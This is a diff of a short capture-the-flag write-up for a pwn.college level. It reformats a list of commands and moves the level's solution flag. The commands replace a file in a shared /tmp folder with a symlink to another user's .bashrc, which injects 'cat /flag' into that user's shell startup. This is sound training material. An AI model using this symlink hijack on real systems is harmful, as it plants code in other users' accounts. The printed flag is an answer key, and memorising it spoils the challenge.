@@ -18,11 +18,12 @@ Recall from the previous level that, having write access to `/tmp/collab`, the�
 
 You _know_ the file to link to. Pull off the attack, and get `/flag` (which, for this level, Zardus can read again!).
 
+**flag:** `pwn.college{gRDnjihKpBi3dKvLsfdTamxM5qA.0VM0EzNxwyNwkzNyEzW}`
 
 Command used: 
-`rm /tmp/collab/evil-commands.txt`
-`ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt`
-`/challenge/victim # to write cat /flag to bashrc`
-`/challenge/victim # to trigger cat`
+- `rm /tmp/collab/evil-commands.txt`
+- `ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt`
+- `/challenge/victim # to write cat /flag to bashrc`
+- `/challenge/victim # to trigger cat`
 
-flag: `pwn.college{gRDnjihKpBi3dKvLsfdTamxM5qA.0VM0EzNxwyNwkzNyEzW}`
+
